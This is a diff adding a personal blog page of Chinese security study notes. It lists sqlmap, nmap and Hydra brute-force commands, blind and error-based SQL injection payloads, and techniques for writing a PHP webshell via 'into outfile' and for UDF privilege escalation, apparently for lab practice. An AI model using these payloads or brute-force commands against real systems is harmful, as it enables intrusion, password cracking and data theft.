@@ -1,0 +1,321 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>2020年2月04日学习笔记 | 柠檬茶的博客</title>
+  <meta name="author" content="John Doe">
+
+  
+  <meta name="description" content="SQLmap常用参数
+-u 单个URL -m xx.txt 多个URL
+-d &amp;quot;mysql://user:password@10.10.10.137:3306/dvwa&amp;quot;  作为服务器客户端，直接连接数据库
+--data post/get都适用
+-p 指定扫描的参数
+-r 读取文">
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="2020年2月04日学习笔记">
+  <meta property="og:site_name" content="柠檬茶的博客">
+
+  
+  
+
+  
+    <meta property="og:image" content="/img/11.jpg">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="柠檬茶的博客" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">柠檬茶的博客</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-02-04T08:56:12.000Z"><a href="/2020/02/04/20200204/">2020-02-04</a></time>
+      
+      
+  
+    <h1 class="title">2020年2月04日学习笔记</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><p>常用参数</p>
+<pre><code>-u 单个URL -m xx.txt 多个URL
+-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库
+--data post/get都适用
+-p 指定扫描的参数
+-r 读取文件
+-f 指纹信息
+--tamper 混淆脚本，用于应用层过滤
+--cookie --user-agent --host等等http头的修改
+--threads 并发线程 默认为1
+--dbms MySQL&lt;5.0&gt; 指定数据库或版本
+
+–level=LEVEL 执行测试的等级（1-5，默认为 1）
+–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险
+–current-db / 获取当前数据库名称
+–dbs 枚举数据库管理系统数据库
+–tables 枚举 DBMS 数据库中的表
+–columns 枚举 DBMS 数据库表列
+-D DB 要进行枚举的数据库名
+-T TBL 要进行枚举的数据库表
+-C COL 要进行枚举的数据库列
+-U USER 用来进行枚举的数据库用户
+</code></pre><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*
+-iL ip.txt 扫描ip.txt的所有ip
+-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描
+-O 探测操作系统信息
+-sV 查找主机服务版本号
+-sA 探测该主机是否使用了包过滤器或防火墙
+-sS 半开扫描，一般不会记入日志，不过需要root权限。
+-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。
+-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。
+-sN TCP空扫描
+-F 快速扫描
+-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。
+-p 指定端口/端口范围
+-oN 将报告写入文件
+-v 详细信息
+-T&lt;0-5&gt; 设定速度
+</code></pre><p>Nmap还可以用到爆破等一些脚本</p>
+<pre><code>--script all 使用所有脚本
+--script=sql.injection.nse sql注入
+--script=&quot;smb*&quot;  扫smb系列
+</code></pre><p>#### </p>
+<h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p>
+<pre><code>hydra IP -l loginname -P pass.txt PROTROCL
+hydra 127.0.0.1 -l root -P pass.txt ssh
+</code></pre><h2 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h2><ul>
+<li><p>@为用户变量，使用<code>SET @var1=1</code>赋值</p>
+</li>
+<li><p>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></p>
+</li>
+</ul>
+<h2 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入/绕过常用的函数"></a>注入/绕过常用的函数</h2><ol>
+<li>基于布尔SQL盲注<ul>
+<li><code>left(database(),1)&gt;&#39;s&#39;</code></li>
+<li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li>
+<li><code>ascii(substr((select database()),1,1))=98</code></li>
+<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li>
+<li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li>
+<li><code>select user() like &#39;ro%&#39;</code></li>
+</ul>
+</li>
+<li>基于报错的SQL盲注<ul>
+<li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code></li>
+</ul>
+</li>
+</ol>
+<p>#### </p>
+<h2 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h2><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4><ol>
+<li>写shell用什么函数？<ul>
+<li><code>select &#39; into outfile &#39;D:/shelltest.php&#39;</code></li>
+<li><code>dumpfile</code></li>
+<li><code>file_put_contents</code></li>
+</ul>
+</li>
+<li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 </li>
+<li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li>
+<li>sleep()能不能写shell？</li>
+<li>写shell的条件？<ul>
+<li>用户权限</li>
+<li>目录读写权限</li>
+<li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 </li>
+<li>open_basedir: 将用户可操作的文件限制在某目录下</li>
+</ul>
+</li>
+</ol>
+<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><h3 id="spring加入配置"><a href="#spring加入配置" class="headerlink" title="spring加入配置"></a>spring加入配置</h3><!-- controller注解扫描 -->
+<p>&lt;context:component-scan base-package=<em>“cn.cnn.springboot.controller”</em> /&gt;</p>
+<!-- 注解驱动 -->
+<p>&lt;mvc:annotation-driven /&gt;</p>
+<hr>
+<p><strong>site:域名 inurl:admin</strong>  查找后台</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/安全/">安全</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:fakerye.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/CTF/">CTF</a><small>1</small></li>
+  
+    <li><a href="/categories/Web/">Web</a><small>3</small></li>
+  
+    <li><a href="/categories/CTF/Web/">Web</a><small>1</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/categories/Web/笔记/">笔记</a><small>3</small></li>
+  
+    <li><a href="/categories/安全/笔记/">笔记</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/02/04/20200204/">2020年2月04日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/02/01/20200201/">2020年2月01日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/29/20200129/">2020年1月29日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/15/20200115/">2020年1月15日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/14/20200114/">2020年1月14日学习笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/CTF/">CTF</a><small>4</small></li>
+  
+    <li><a href="/tags/SQL/">SQL</a><small>1</small></li>
+  
+    <li><a href="/tags/Web/">Web</a><small>6</small></li>
+  
+    <li><a href="/tags/Writeup/">Writeup</a><small>1</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/tags/扩展/">扩展</a><small>1</small></li>
+  
+    <li><a href="/tags/笔记/">笔记</a><small>9</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/安全/" style="font-size: 13.33px;">安全</a> <a href="/tags/扩展/" style="font-size: 10px;">扩展</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2020 John Doe
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
